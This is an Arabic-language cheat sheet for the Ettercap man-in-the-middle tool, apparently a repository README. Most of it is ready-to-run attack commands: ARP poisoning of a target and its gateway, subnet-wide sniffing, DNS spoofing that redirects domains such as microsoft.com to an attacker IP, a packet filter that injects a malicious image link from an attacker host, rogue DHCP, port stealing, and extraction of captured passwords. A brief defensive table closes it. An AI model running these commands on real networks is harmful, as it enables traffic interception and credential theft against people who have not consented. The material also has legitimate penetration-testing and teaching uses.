<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ورقة الغش في Ettercap

[Ettercap](https://www.ettercap-project.org/) عبارة عن مجموعة شاملة لهجمات الرجل في الوسط (MITM) على شبكات المنطقة المحلية (LAN). إنه يتميز باستنشاق الاتصالات المباشرة، وتصفية المحتوى بسرعة، والتشريح النشط والسلبي للعديد من البروتوكولات، ودعم تسميم ARP، وعمليات إعادة توجيه ICMP، وانتحال DHCP، وسرقة المنافذ.

---

## جدول المحتويات

- [البنية الأساسية والأوضاع](#core-architecture--modes)
- [التثبيت والإعداد السريع](#installation--الإعداد السريع)
- [تسمم واستنشاق ARP](#تسمم--استنشاق)
- [هجمات انتحال DNS](#dns-spoofing-attacks)
- [تصفية الحزم المخصصة (`etterfilter`)](#تصفية الحزم المخصصة-etterfilter)
- [انتحال DHCP وسرقة المنافذ](#dhcp-spoofing--port-stealing)
- [التسجيل واستخراج الحزم](#logging--packet-extraction)
- [الكشف الدفاعي والتدابير المضادة](#الكشف الدفاعي--التدابير المضادة)

---

## البنية الأساسية والأوضاع

يدعم Ettercap أوضاع تنفيذ متعددة:
- **`-T` (وضع النص):** مخرج طرفي خفيف الوزن وغير ملعون، مثالي للبرمجة النصية والأتمتة بدون رأس.
- **`-C` (وضع اللعنات):** واجهة مستخدم طرفية قائمة على Ncurses للعمليات التفاعلية بدون X11.
- **`-G` (وضع GTK):** واجهة رسومية كاملة.
- **`-D` (الوضع الخفي):** يعمل بصمت في الخلفية.

بناء جملة المواصفات المستهدفة:
```text
/MAC/IPs/IPv6/PORTs
```
- يمكن أن تكون الأهداف مفصولة بفواصل أو نطاقات IP: `//` يطابق كل شيء.
- مثال: يستهدف `/192.168.1.50/` IP `192.168.1.50` على جميع المنافذ.
- مثال: يستهدف `//80,443/` كافة الأجهزة المضيفة على المنفذين 80 و443.

---

## التثبيت والإعداد السريع
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y ettercap-text-only ettercap-graphical

# Arch Linux / BlackArch
sudo pacman -S ettercap

# Enable IP forwarding on the host system
sudo sysctl -w net.ipv4.ip_forward=1
```
التحقق من مواقع ملفات التكوين:
- `/etc/ettercap/etter.conf`: تكوين الشبكة الأساسية وإسقاط الامتيازات.
- `/etc/ettercap/etter.dns`: جدول البحث عن سجلات انتحال DNS.

---

## التسمم والاستنشاق بـ ARP

### 1. تسمم ARP عن بعد في اتجاهين
جداول ARP السامة بين محطة العمل المستهدفة وبوابة الشبكة:
```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1//
```
- `-T`: وضع النص.
- `-q`: الوضع الهادئ (يقلل من الإسهاب، ويعرض بيانات الاعتماد الملتقطة فقط).
- `-i eth0`: واجهة شبكة الاستماع والحقن.
- `-M arp:remote`: تنفيذ عملية تسميم ARP ثنائية الاتجاه للرجل في المنتصف.

### 2. استنشاق الشبكة الفرعية بالكامل (اتجاه واحد / بث)
قم بتسميم جميع الأجهزة المضيفة على الشبكة الفرعية مقابل البوابة الافتراضية:
```bash
sudo ettercap -T -q -i eth0 -M arp:remote // /192.168.1.1//
```
### 3. الاستنشاق السلبي فقط
التقط بيانات اعتماد النص العادي التي تمر عبر المضيف الحالي دون انتحال ARP:
```bash
sudo ettercap -T -q -i eth0
```
---

## هجمات انتحال DNS

يتضمن Ettercap مكونات إضافية مدمجة، بما في ذلك `dns_spoof`.

### الخطوة 1: تكوين `/etc/ettercap/etter.dns`
إضافة حرف بدل أو إعادة توجيه مجال محدد:
```text
# Redirect target domain to attacker machine
target.corp.local      A   192.168.1.100
*.target.corp.local    A   192.168.1.100
microsoft.com          A   192.168.1.100
```
### الخطوة 2: قم بتشغيل Ettercap باستخدام مكون DNS الإضافي
```bash
sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /192.168.1.50// /192.168.1.1//
```
- `-P dns_spoof`: يقوم بتنشيط البرنامج المساعد لتزييف DNS.
- تقوم استعلامات DNS التي تم اعتراضها والتي تطابق `etter.dns` بإرجاع عنوان IP الخاص بالمهاجم.

---

## تصفية الحزم المخصصة (`etterfilter`)

يتيح Ettercap فحص الحزم في الوقت الفعلي وتعديل الحمولة باستخدام نصوص التصفية المخصصة.

### 1. كتابة نص التصفية (`replace_img.filter`)
```text
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
        replace("Accept-Encoding", "Accept-Rubbish");
    }
}

if (ip.proto == TCP && tcp.src == 80) {
    replace("img src=", "img src=\"http://192.168.1.100/evil.jpg\" ");
    msg("[*] Injected malicious image link!\n");
}
```
### 2. قم بتجميع عامل التصفية باستخدام `etterfilter`
```bash
etterfilter replace_img.filter -o replace_img.ef
```
### 3. التنفيذ باستخدام الفلتر
```bash
sudo ettercap -T -q -i eth0 -F replace_img.ef -M arp:remote /192.168.1.50// /192.168.1.1//
```
---

## انتحال DHCP وسرقة المنافذ

### 1. هجوم محتال على خادم DHCP
الاستجابة بشكل أسرع من خادم DHCP الشرعي لتعيين البوابة المارقة وعناوين DNS:
```bash
sudo ettercap -T -i eth0 -M dhcp:192.168.1.200-250/255.255.255.0/192.168.1.1
```
- بناء الجملة: `dhcp:<ip_pool_start-end>/<netmask>/<dns_ip>`

### 2. هجوم سرقة المنفذ (إغراق المحول / إساءة استخدام جدول CAM)
سرقة حركة المرور على الشبكات المحولة حيث يتم حظر أو تنبيه تسمم ARP:
```bash
sudo ettercap -T -q -i eth0 -M port /192.168.1.50// /192.168.1.1//
```
---

## التسجيل واستخراج الحزم

### حفظ الجلسات الملتقطة الأولية
```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1// -w capture.pcap -L ettercap_log
```
- `-w capture.pcap`: كتابة بيانات حزمة pcap الأولية.
- `-L ettercap_log`: كتابة سجلات نصية مقطعة يمكن قراءتها بواسطة الإنسان.

### تحويل السجلات الثنائية باستخدام `etterlog`
```bash
# Print captured credentials and passwords
etterlog -p ettercap_log.eci

# Extract traffic in pcap format
etterlog -c -F TCP:192.168.1.50:80 ettercap_log.ecp -w http_session.pcap
```
---

## الكشف الدفاعي والتدابير المضادة

| ناقل | آلية الكشف والدفاع |
|---|---|
| ** انتحال ARP ** | تمكين فحص ARP الديناميكي (DAI) على المحولات المُدارة؛ فحص `arp -a` بحثًا عن أجهزة MAC المكررة؛ قم بتشغيل `arpwatch` أو `arpon`. |
| ** انتحال DNS ** | فرض DNSSEC، أو DoH (DNS-over-HTTPS)، أو DoT (DNS-over-TLS). |
| ** انتحال DHCP ** | قم بتمكين DHCP Snooping على المحولات لتعيين منافذ الوصلة الصاعدة الموثوقة. |
| ** سرقة المنافذ ** | تنفيذ التحكم في الوصول إلى الشبكة (NAC) 802.1X وأمن المنافذ مع حدود MAC لكل منفذ محول. |